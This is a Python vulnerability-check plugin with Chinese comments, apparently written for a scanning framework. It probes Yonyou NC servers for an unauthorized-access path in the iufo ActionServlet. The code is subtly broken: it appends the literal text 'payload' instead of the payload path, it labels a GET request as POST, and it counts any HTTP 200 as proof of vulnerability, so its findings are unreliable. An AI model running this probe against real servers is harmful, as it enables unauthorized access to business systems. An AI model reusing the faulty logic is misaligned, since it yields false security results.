#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友NC 未授权访问
referer: 无
author: M
description: 用友NC 未授权访问
'''
import sys
import requests
import warnings
#方法名称自定义
def run(url):
        #此处编辑检测代码
        #示例代码，请更改result内容，result[0]为漏洞名称,result[1]为返回的内容，result[2]为测试结果
        result = ['用友NC 未授权访问','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID="
        url_path = url + "payload"
        try:
            data = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if data.status_code == 200 :
                result[2]= "存在"
                result[1] = "URL:%s\nPOST:%s"%(url_path,payload)
            else:
                result[2] = "不存在"
        except Exception as e:
            # print (e)
            result[2] ="不存在"
            #这里可设置不存在，连接超时等，只有不存在不会显示到结果中。
        # print(result)
        return result
        #最后一定要返回一个带有3个参数的列表。不然会出错误。

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = run("http://baidu.com")
    print()